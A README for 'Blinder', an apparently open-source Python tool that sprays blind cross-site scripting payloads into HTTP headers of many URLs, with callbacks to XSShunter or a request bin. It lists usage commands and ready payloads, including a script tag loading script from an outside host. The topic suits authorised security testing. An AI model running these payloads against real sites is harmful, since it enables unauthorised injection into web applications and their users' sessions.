# Blinder
- A script written in python3 to spread blind cross-site scripting payloads on HTTP requests headers

## Description
- Blinder is an automation tools written in python3, used to spread sending blind payloads into HTTP servers using XSShunter or custom requests bin, with custom payloads so you can test for more issues like SSTI, CSTI and XSS

![preview](https://i.imgur.com/RugY1vS.png)

### Installation
```
git clone https://github.com/DEMON1A/Blinder
cd Blinder
python3 Blinder.py [ARGS]
```

# How To Use:
## Basic:
- That's blinder basic usage example, you just specify XSShunter username using `-u` argument and the URLs file using `-f` argument
```
python3 Blinder.py -u xsshunter -f urls-file.txt
```

## Redirections
- To disalow/allow redirects on blinder, all you need to-do is use `-r` option with either `deny` or `allow` strings

```
python3 Blinder.py -u xsshunter -f urls-file.txt -r deny
```
## Payloads and multi payloads.
- In blinder, the default payload we use is `"><script src={xsshunter-url}></script>`, But you can always use your own payload using `-p` argument.
```
python3 Blinder.py -u hacker -f urls-file.txt -p '"><img src="XXX">'
```

- If you wanna use more than one payload, you can seperate them using `,` character for example: `"><script>alert(1)</script>,"><svg/onload=alert(1)>`, if your payload requires `,` character and you can't seperate them using that character you can use `-s` option to use another character to-do that

```
python3 Blinder.py -u xsshunter -f urls-file.txt -p '<img src="XXX">,<iframe src="XXX">'
```
```
python3 Blinder.py -u xsshunter -f urls-file.txt -p '<img src="XXX">_<iframe src="XXX">' -s '_'
```

- By default, Blinder uses `XXX` as string to replace with the XSShunter/requestbin URL, incase that can't be used with your payload and your payload contains `XSS` inside of it, you can always use `--replace` argument to use another string to replace it with 

```
python3 Blinder.py -u xsshunter -f urls-file.txt -p '<img src="RRR">_<iframe src="RRR">' -s '_' --replace 'RRR'
```

## Headers
- By default, Blinder sends the payloads on the `User-agent` header because it's more likely to get stored on web application by requests logs and other stuff, you can use your custom header in case you're testing for a known vulnerability, CVE or anything else

```bash
python3 Blinder.py -u xsshunter -f urls-file.txt --header Header-name 
```

## Requests bin
- You can use your own requests bin, burpcollabrator, interactsh or anything else using `-b` argument

```bash
python3 Blinder.py -b https://request-bin.com/ -f urls-file.txt
```

### What's New?
- Threading to improve the tool performance.
- Added an option allows you to use your own requests bin instead of using XSShunter.
- Added an option where you can use your own payloads instead of the default one.
- Added an option to enable/disable redirects on requests
- Added an option where you can use more than one payload, and choose the splitting character
- Added an option allows you to use your own custom headers on HTTP requests
- Added an option allows you to select your own replace word on the payload
- Cleaner Code!

### Issues:
- Feel free to open an issue on github issue tracker, I usually respond to such stuff quickly
- If you need help, you can always find me [@DemoniaSlash](https://twitter.com/DemoniaSlash) 
